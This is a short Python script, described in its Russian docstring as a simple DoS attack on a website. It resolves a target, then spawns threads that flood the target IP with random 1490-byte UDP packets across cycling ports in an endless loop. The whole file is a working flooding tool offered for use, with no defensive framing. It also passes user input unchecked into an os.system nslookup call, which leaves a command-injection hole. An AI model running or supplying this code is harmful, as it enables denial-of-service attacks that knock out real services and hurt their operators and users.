"""
простая dos атака на сайт
~100_000 пакетов за 20s
"""
import os
import time
import socket
import random
import threading

def attack(ip, port, color='\033[92m'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print(color + "%s packet sent to %s:%s" % (sent, ip, port))
        if port == 65534:
            port = 1


if __name__ == '__main__':
    BLUE, RED, GREEN, YELLOW, CYAN, END = '\033[94m', '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[0m'
    web = input("Target website: ")
    print(os.system(f"nslookup {web}"))

    # www.webscantest.com
    ip = input(f"{BLUE}[*] {GREEN}IP Target >>> {END} ")
    # 53
    port = int(input(f"{BLUE}[*] {GREEN}PORT >>> {END} "))

    os.system("clear")
    print(f"{BLUE}Подготовка к атаке{END}")
    print(f"{CYAN} ======D     15% {END}"); time.sleep(.2)
    print(f"{CYAN} =============D      25% {END}"); time.sleep(.3)
    print(f"{CYAN} ====================D       50% {END}"); time.sleep(.4)
    print(f"{CYAN} =============================D        75% {END}"); time.sleep(.3)
    print(f"{CYAN} =====================================D     100% {END}"); time.sleep(.2)
    os.system("clear")

    colors = [BLUE, RED, GREEN, YELLOW, CYAN, '\033[95m', '\033[90m', '\033[97m',]
    N = int(input(f"{BLUE}[*] {GREEN}Number Thread {RED}[max target = 8]  {GREEN}>>> {END} "))

    for i in range(N):
        t = threading.Thread(target=attack, args=(ip, port, colors[i]))
        t.start()
